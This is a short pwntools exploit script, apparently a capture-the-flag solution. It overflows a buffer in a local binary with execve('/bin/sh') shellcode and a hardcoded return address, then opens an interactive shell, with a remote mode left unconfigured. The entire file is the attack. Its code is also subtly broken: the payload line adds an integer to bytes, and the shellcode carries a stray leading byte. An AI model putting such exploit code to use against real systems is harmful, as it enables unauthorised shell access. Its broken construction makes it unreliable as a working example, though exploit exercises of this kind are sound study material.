from pwn import *
import sys

exe = ELF("./a.out")
context.binary = exe.path
HOST = ''
PORT = -1

def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    elif args.TRACE:
        r  = process(["strace", "-o","strace.out", exe.path])
    else:
        r = process([exe.path])
    return r

def main():
    r = conn()
    # gdb.attach(r)

    shell_code = b' \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
    OFFSET = 100
    buffer_address = b'\xff\xff\x03\xdf'
    payload = shell_code + OFFSET - len(shell_code) + buffer_address
    rep = r.recvuntil(b'user input:')
    r.send(payload)

    r.interactive()

if __name__ == "__main__":
	main()